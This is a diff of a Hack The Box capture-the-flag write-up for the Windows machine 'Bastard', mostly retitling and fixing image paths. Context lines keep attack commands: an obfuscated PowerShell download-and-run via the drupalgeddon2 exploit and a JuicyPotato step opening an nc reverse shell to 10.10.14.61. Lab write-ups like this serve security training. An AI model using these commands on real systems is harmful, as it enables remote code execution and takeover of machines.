@@ -1,12 +1,20 @@
-# Windows
+# Bastard v.1
 
 ## Enumeration
 
+### Legion
+
+> This package contains an open source, easy-to-use, super-extensible and semi-automated network penetration testing tool that aids in discovery, reconnaissance and exploitation of information systems.
+
+{% embed url="https://www.kali.org/tools/legion" %}
+
 ### Port 80
+
+#### Version
 
 * Drupal 7.54, 2017-02-01
 
-![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_drupal\_version.png)
+![](../../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_drupal\_version.png)
 
 ### RCE
 
@@ -96,17 +104,17 @@ SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
 drupalgeddon2>> powershell.exe -nop -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANgAxAC8AcABzAF8AdABjAHAALgBwAHMAMQAiACkA
 ```
 
-![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_setup\_listener.png)
+![](../../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_setup\_listener.png)
 
-![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_gained\_shell.png)
+![](../../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_gained\_shell.png)
 
-![](<../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_whoami (1).png>)
+![](<../../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_whoami (1).png>)
 
 ## Privledge Escalation
 
 {% embed url="https://youtu.be/eLNYc-1ScdU?t=9033" %}
 
-![](<../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_Pasted image 20220404181827.png>)
+![](<../../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_Pasted image 20220404181827.png>)
 
 {% embed url="https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505" %}
 
@@ -130,12 +138,12 @@ Impersonating a SYSTEM process with a different service
 .\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\inetpub\drupal-7.54\nc64 -e cmd.exe 10.10.14.61 8444" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
 ```
 
-![](<../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_Pasted image 20220404190117.png>)
+![](<../../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_Pasted image 20220404190117.png>)
 
-![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_whoami\_system.png)
+![](../../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_whoami\_system.png)
 
 ## Flags
 
-![](<../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_userflag (1).png>)
+![](<../../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_userflag (1).png>)
 
-![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_rootflag.png)
+![](../../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_rootflag.png)
